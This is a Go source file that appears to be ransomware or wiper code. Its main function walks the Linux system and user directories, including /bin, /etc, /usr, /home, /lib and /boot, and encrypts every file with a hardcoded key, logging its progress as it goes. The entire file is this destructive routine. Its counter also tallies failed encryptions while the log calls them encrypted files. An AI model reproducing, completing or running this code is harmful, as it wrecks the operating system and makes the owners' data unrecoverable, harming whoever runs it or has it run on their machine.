package main

import (
	"log"
)

func encryptFolder(files []string) int {
	cnt := 0
	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
	for _, filename := range files {
		err := encrypt(filename, key)
		if err != nil {
			cnt++
		}
	}
	
	return cnt
}

func encryptSystem() {
	log.Println("[-] Getting bin files")
	bin := fileList("/bin")
	log.Println("[+] Got bin files")
	log.Println("[*] Starting to encrypt bin folder")
	cnt := encryptFolder(bin)
	log.Println("[+] Encrypted ", cnt, " files in bin folder")
	
	
	log.Println("[-] Getting bin files")
	sbin := fileList("/sbin")
	log.Println("[+] Got sbin files")
	log.Println("[*] Starting to encrypt bin folder")
	cnt = encryptFolder(sbin)
	log.Println("[+] Encrypted ", cnt, " files in sbin folder")
	
	
	log.Println("[-] Getting etc files")
	etc := fileList("/etc")
	log.Println("[+] Got etc files")
	log.Println("[*] Starting to encrypt etc folder")
	cnt = encryptFolder(etc)
	log.Println("[+] Encrypted ", cnt, " files in etc folder")
	
	
	log.Println("[-] Getting usr files")
	usr := fileList("/usr")
	log.Println("[+] Got usr files")
	log.Println("[*] Starting to encrypt usr folder")
	cnt = encryptFolder(usr)
	log.Println("[+] Encrypted ", cnt, " files in usr folder")
	
	
	log.Println("[-] Getting var files")
	varr := fileList("/var")
	log.Println("[+] Got var files")
	log.Println("[*] Starting to encrypt var folder")
	cnt = encryptFolder(varr)
	log.Println("[+] Encrypted ", cnt, " files in var folder")
	
	
	log.Println("[-] Getting home files")
	home := fileList("/home")
	log.Println("[+] Got home files")
	log.Println("[*] Starting to encrypt home folder")
	cnt = encryptFolder(home)
	log.Println("[+] Encrypted ", cnt, " files in home folder")
	
	
	log.Println("[-] Getting lib files")
	lib := fileList("/lib")
	log.Println("[+] Got lib files")
	log.Println("[*] Starting to encrypt lib folder")
	cnt = encryptFolder(lib)
	log.Println("[+] Encrypted ", cnt, " files in lib folder")
	
	
	log.Println("[-] Getting opt files")
	opt := fileList("/opt")
	log.Println("[+] Got opt files")
	log.Println("[*] Starting to encrypt opt folder")
	cnt = encryptFolder(opt)
	log.Println("[+] Encrypted ", cnt, " files in opt folder")
	
	
	log.Println("[-] Getting tmp files")
	tmp := fileList("/tmp")
	log.Println("[+] Got tmp files")
	log.Println("[*] Starting to encrypt tmp folder")
	cnt = encryptFolder(tmp)
	log.Println("[+] Encrypted ", cnt, " files in tmp folder")
	
	
	log.Println("[-] Getting boot files")
	boot := fileList("/boot")
	log.Println("[+] Got boot files")
	log.Println("[*] Starting to encrypt boot folder")
	cnt = encryptFolder(boot)
	log.Println("[+] Encrypted ", cnt, " files in boot folder")
}

func main() {
	encryptSystem()
}
